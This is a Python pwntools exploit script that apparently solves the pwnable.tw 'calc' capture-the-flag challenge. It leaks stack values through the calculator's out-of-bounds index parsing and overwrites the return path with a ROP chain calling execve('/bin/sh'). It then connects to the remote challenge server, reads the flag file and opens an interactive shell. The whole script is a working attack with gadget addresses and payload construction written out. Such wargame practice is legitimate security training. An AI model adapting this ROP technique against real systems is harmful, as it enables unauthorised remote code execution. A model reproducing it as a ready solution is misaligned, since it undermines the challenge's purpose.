from pwn import *

BIN="./calc"

addrs = ['+361','+362','+363','+364','+365','+366','+367','+368','+369']

# ROP 
#     0x0805c34b :   pop eax ; ret
#     0x0000000b       
#     0x080701d0 :   pop edx ; pop ecx ; pop ebx ; ret
#     0x00000000
#     0x00000000
#     address_str
#     c :   int 0x80
# address_str = "/bin/sh" 
# 0x6e69622f
# 0x0068732f

payloads = [0x0805c34b,0x0000000b,0x080701d0,0x00000000,0x00000000,0x00000000,0x08049a21,0x6e69622f,0x0068732f]
#payloads = [0x080701aa, 0x080ec060, 0x0805c34b, int.from_bytes(b'/bin', byteorder='little', signed=False), 0x0809b30d, 0x080701aa, 0x080ec064, 0x0805c34b, int.from_bytes(b'//sh', byteorder='little', signed=False), 0x0809b30d, 0x080701aa, 0x080ec068, 0x080550d0, 0x0809b30d, 0x080481d1, 0x080ec060, 0x080701d1, 0x080ec068, 0x080ec060, 0x080701aa, 0x080ec068, 0x080550d0, 0x0807cb7f, 0x0807cb7f, 0x0807cb7f, 0x0807cb7f, 0x0807cb7f, 0x0807cb7f, 0x0807cb7f, 0x0807cb7f, 0x0807cb7f, 0x0807cb7f, 0x0807cb7f, 0x08049a21]

def Rop(io):
    for i in range(len(payloads)):
        print("[+] Leak payload : ",addrs[i])
        io.sendline(addrs[i])
        leak_value = int(io.recv(1024)) 
        print("[+] Leak value : ", leak_value)
        offset = payloads[i]- leak_value
        print("[+] Offset : ", offset)
        payload = '%s%+d' % (addrs[i],offset)
        print("[!] Payload : ",payload)
        io.sendline(payload)
        print("[!] Stack : ",hex(payloads[i]))
        print("[*]===========> %s"  % hex(int(io.recv(1024))))


#io = process(BIN)
io = remote('chall.pwnable.tw', 10100)
#raw_input("DEBUG")

# _breakpoint = """
#     0x080493f2
#     """

# gdb.attach(io,_breakpoint)
io.recv(1024)
io.sendline("+360")
pre_ebp = int(io.recv(1024))
payloads[5] = pre_ebp
print("[-] =========> Pre_ebp: " ,payloads[5])
Rop(io)
io.sendline("cat /home/calc/flag")

io.interactive()


#0xffffca9c - > 0xffffd02c

